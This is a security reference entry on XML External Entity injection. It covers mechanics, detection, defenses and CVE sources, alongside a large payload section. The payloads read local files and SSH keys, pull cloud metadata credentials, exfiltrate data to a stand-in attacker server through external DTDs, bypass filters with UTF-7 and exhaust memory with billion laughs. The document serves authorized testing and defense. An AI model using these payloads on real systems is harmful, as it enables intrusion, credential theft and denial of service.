# XML External Entity Injection

> An XML parser resolves attacker-defined external entities, exposing files or SSRF. **Deep dive:** [`Troubleshooting_Guide/xxe.md`](../../../../Troubleshooting_Guide/xxe.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** XXE · A05:2021 Misconfiguration
**Status:** complete

## What it is
XML External Entity (XXE) injection occurs when an application parses XML that allows the attacker
to define and reference external entities, and the parser resolves them. Because an external
entity can point at a file path or URL, the parser fetches that resource and embeds it into the
document, exposing local files or making server-side requests.

## How it works
XML's DTD lets a document declare entities, including external ones via `SYSTEM "file://..."` or
`SYSTEM "http://..."`. A parser configured to process DTDs and external entities will dereference
them during parsing. The attacker controls the XML input; the application's mistake is using a
default-configured or legacy parser that resolves external entities and DTDs. When the resolved
entity is reflected in a response it is a direct read; when it is not, parameter entities (`%`)
and an attacker-hosted external DTD turn it into a blind out-of-band or error-based channel.

## Impact
Disclosure of arbitrary local files (credentials, keys, source), server-side request forgery to
internal services and cloud metadata endpoints (e.g. AWS IAM credentials), and in some parsers
denial of service via recursive entity expansion ("billion laughs"). Some configurations allow
escalation toward RCE through dangerous URL handlers. Typically high to critical severity.

## How to detect
- An internal-entity probe (`<!ENTITY x "TEST_123">` referenced as `&x;`) is reflected back,
  confirming entities are processed.
- A `file://` entity in a reflected field returns file contents in the response.
- Blind: a `SYSTEM "http://collaborator"` entity (general or parameter) produces an inbound
  HTTP/DNS hit on a controlled host.
- Error-based: pointing an entity into an invalid path surfaces file contents inside the parser's
  error message.

## Exploitation (summary)
First confirm XML is parsed and DTDs/entities are allowed, then define an external entity pointing
at `file://` (read) or `http://` (SSRF). If the value is reflected, read it directly; if blind,
use a parameter entity plus an attacker-hosted external DTD to exfiltrate out-of-band or via parse
errors, falling back to local-DTD repurposing when external fetches are blocked. Where you can't
control the whole document, use XInclude; XXE also rides inside SVG, Office documents, SOAP, and
feeds. Full payloads are in the Payloads section and deep-dive note.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

### Recon — is XML processed, are DTDs allowed?
Send escalating probes: plain XML, then an internal entity, then a DOCTYPE. If `TEST_123` is reflected, entities are processed; if the DOCTYPE causes no error, DTDs are allowed.

```xml
<?xml version="1.0"?><test>hello</test>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x "TEST_123">]><test>&x;</test>
<?xml version="1.0"?><!DOCTYPE foo SYSTEM ""><test>hello</test>
```

### Basic XXE — read local files
Define an external entity and reference it in a reflected field.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

High-value targets by platform:

```xml
<!-- Linux -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///etc/hostname">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
<!ENTITY xxe SYSTEM "file:///proc/version">
<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">
<!ENTITY xxe SYSTEM "file:///var/www/html/wp-config.php">
<!-- Windows -->
<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">
<!ENTITY xxe SYSTEM "file:///c:/boot.ini">
```

### SSRF via XXE
Swap the `file://` URL for an HTTP URL to reach internal services and cloud metadata.

```xml
<!-- AWS EC2 metadata (enumerate iteratively) -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
<!-- GCP metadata -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
<!-- internal services -->
<!ENTITY xxe SYSTEM "http://localhost:80/">
<!ENTITY xxe SYSTEM "http://127.0.0.1:22/">
<!ENTITY xxe SYSTEM "http://internal-admin.local/">
```

### Blind XXE — out-of-band detection
No reflection: confirm parsing by forcing an outbound request. Parameter entities (`%`) work where general entities are stripped in the DTD subset.

```xml
<!-- simple OOB -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR-SERVER.com/xxe-test"> ]>
<!-- parameter entity variant -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-SERVER.com/xxe-test">
  %xxe;
]>
```

### Blind XXE — exfiltration via external DTD
Host a DTD that reads a file and appends it to a request back to your server.

```xml
<!-- malicious.dtd on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER.com/?x=%file;'>">
%eval;
%exfil;
```

```xml
<!-- trigger from victim -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-SERVER.com/malicious.dtd">
  %xxe;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

### Blind XXE — error-based exfiltration
When no OOB channel exists, reference the file contents inside an invalid path; the parse error leaks them.

```xml
<!-- error.dtd: SYSTEM points the file into a nonexistent path -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
<!-- error: java.io.FileNotFoundException: /invalid/root:x:0:0:root:... -->
```

### Local DTD repurposing (external DTD blocked)
Redefine an entity inside a DTD that already exists on the target filesystem.

```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Common local DTD paths: `/usr/share/yelp/dtd/docbookx.dtd`, `/usr/share/xml/fontconfig/fonts.dtd`, `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd`, `/etc/xml/catalog`.

### XInclude (can't control the full document)
When input is inserted into a server-built XML document, you can't declare a DOCTYPE — use XInclude instead.

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### File-upload / content-type vectors
Embed XXE in any XML-derived format the server parses.

```xml
<!-- SVG upload -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="16">&xxe;</text></svg>
```

```xml
<!-- DOCX/XLSX/PPTX: edit word/document.xml or xl/sharedStrings.xml inside the zip -->
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<document><paragraph>&xxe;</paragraph></document>
```

```bash
unzip document.docx -d extracted/
# edit the XML part, add the XXE payload, then repackage
cd extracted && zip -r ../malicious.docx *
```

```xml
<!-- RSS/Atom feed -->
<!DOCTYPE rss [ <!ENTITY xxe SYSTEM "http://internal-admin-panel.local/"> ]>
<rss version="2.0"><channel><description>&xxe;</description></channel></rss>
```

```xml
<!-- SOAP body -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><getUserInfo><userId>&xxe;</userId></getUserInfo></soap:Body>
</soap:Envelope>
```

### Encoding & wrapper bypasses
Defeat keyword filters and read binary/PHP files.

```xml
<!-- UTF-7 (bypasses filters that scan for "<!DOCTYPE") -->
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE foo+AFs-+ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
+ADw-root+AD4-+ACY-xxe+ADs-+ADw-/root+AD4-
```

```xml
<!-- PHP filter wrapper: base64-encode so source isn't parsed as markup -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php">
]>
<root>&xxe;</root>
```

```xml
<!-- Java URL handlers -->
<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/file.txt">
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
```

### Denial of service — billion laughs
Nested entity expansion exhausts memory; use only with explicit authorization.

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!-- ...nest through lol9... -->
]>
<lolz>&lol9;</lolz>
```

### Selection guide

| Situation | Approach |
|-----------|----------|
| Basic XXE, data reflected | internal entity + `SYSTEM file://` |
| SSRF / cloud metadata | `SYSTEM` with HTTP URL |
| Blind, no reflection | parameter entity + external DTD (OOB) |
| Blind, external DTD blocked | local DTD repurposing |
| Error-based blind | external DTD referencing an invalid file path |
| Can't control full XML | XInclude |
| SVG / image upload | XXE inside the SVG XML |
| Office document | XXE in `word/document.xml` or `xl/*.xml` |
| SOAP service | XXE in the SOAP `Body` |
| Filter on `<!DOCTYPE` | UTF-7 encoding |
| Need binary/PHP source | `php://filter` base64 wrapper |

## Defenses
1. **Disable DTDs and external entities** in the XML parser — the single most effective fix
   (e.g. `disallow-doctype-decl`, `FEATURE_SECURE_PROCESSING`, `external-general-entities` and
   `external-parameter-entities` set to false; `libxml_disable_entity_loader`/no `LIBXML_NOENT`).
2. **Prefer simpler data formats** (JSON) where XML is not required, and use a hardened parser
   configuration by default.
3. **Disable XInclude** and entity expansion limits to blunt DOS, and restrict the parser's
   network/file access.
4. Validate and sanitize uploaded XML-derived formats (SVG, DOCX) through the same hardened parser.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=XML+External+Entity+Injection
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=XML+External+Entity+Injection
- **Exploit-DB** — https://www.exploit-db.com/search?q=XML+External+Entity+Injection
- **GitHub Advisories** — https://github.com/advisories?query=XML+External+Entity+Injection
- **OSV** — https://osv.dev/list?q=XML+External+Entity+Injection
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `XML External Entity Injection <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2014-3529` / `CVE-2014-3574` — Apache POI / Tika XXE via Office Open XML parsing.
- `CVE-2018-1000550` — XXE in a widely used library leading to file disclosure and SSRF.
- _Canonical example: the 2014 PayPal/Facebook-class XXE bug bounties, and the Spring/Jackson XML
  data-binding XXE issues that drove "secure by default" parser changes._

## References
- PortSwigger Web Security Academy — XML external entity (XXE) injection.
- OWASP — XML External Entity Prevention Cheat Sheet.
- W3C — XML 1.0 specification (entity and DTD definitions).
